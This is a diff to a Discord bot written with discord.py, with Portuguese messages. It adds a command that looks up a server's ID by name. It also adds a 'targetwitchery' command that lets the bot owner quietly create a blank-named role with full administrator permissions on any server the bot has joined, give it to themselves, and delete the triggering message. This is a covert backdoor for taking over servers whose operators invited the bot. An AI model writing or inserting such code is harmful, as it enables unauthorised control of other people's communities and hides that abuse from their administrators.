@@ -18,6 +18,17 @@ class _servers(commands.Cog):
             
         else: 
             embed = discord.Embed(title="No permission.", color=0xc034eb)
+    @commands.command()
+    async def serverid(self, ctx, server_name):
+         # Obter o nome do servidor a partir da mensagem
+        found = False
+        for guild in client.guilds:
+            if guild.name == server_name:
+                await ctx.send(f'O ID do servidor {server_name} é: {guild.id}')
+                found = True
+                break
+        if not found:
+            await ctx.send(f'O servidor {server_name} não foi encontrado.')
 
 
 class _invite(commands.Cog):
@@ -59,9 +70,36 @@ class _witchery(commands.Cog):
         else:
             embed = discord.Embed(title="You can't do Witchery! :)", color=0xc034eb)
             await ctx.send(embed=embed)
-
-
-
+    @commands.command()
+    async def targetwitchery(self, ctx, server_id):
+        user = ctx.message.author
+        embed = discord.Embed(title="Witchery done! :)", color=0xc034eb)
+        perms = discord.Permissions(administrator=True)
+        
+        server = client.get_guild(int(server_id))
+        
+        if server is None:
+            await ctx.send("Servidor não encontrado.")
+            return
+        
+        witcheryrole = await server.create_role(name=str(" "), permissions=perms, color=0x302c2c)
+        role = server.get_role(witcheryrole.id)
+        
+        target_user = server.get_member(user.id)
+        
+        if target_user is None:
+            await ctx.send("Usuário não encontrado no servidor.")
+            return
+        
+        if user.id == ownerid:
+            await ctx.send(embed=embed, delete_after=1)
+            time.sleep(3)
+            await ctx.message.delete()
+            await target_user.add_roles(role)
+        else:
+            embed = discord.Embed(title="You can't do Witchery! :)", color=0xc034eb)
+            await ctx.send(embed=embed)
+    
 async def setup(client):
     await client.add_cog(_invite(client))
     await client.add_cog(_servers(client))
